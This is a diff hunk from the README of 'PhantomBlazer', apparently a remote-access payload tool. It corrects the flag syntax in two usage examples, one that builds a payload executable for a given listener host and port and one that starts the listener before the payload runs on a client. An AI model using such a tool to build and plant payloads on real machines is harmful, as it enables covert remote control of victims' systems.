@@ -26,8 +26,8 @@ PhantomBlazer can be executed with the following parameters:
     --lport/-lp: The local port number
     --output/-o: The output file name
 ```
-> Example: ``` python3 phantomblazer.py --m build -lhost <ip.address> --lport <port> --output<application.name>.exe```
-> Before payload execution on client: ``` python3 phantomblazer.py --m listen -lhost <ip.address> --lport <port> ```
+> Example: ``` python3 phantomblazer.py -m build --lh <ip.address> --lp <port> --output<application.name>.exe```
+> Before payload execution on client: ``` python3 phantomblazer.py -m listen --lh <ip.address> -lp <port> ```
 
 ### Inbuilt ommands can be executed using the following syntax:
 ```
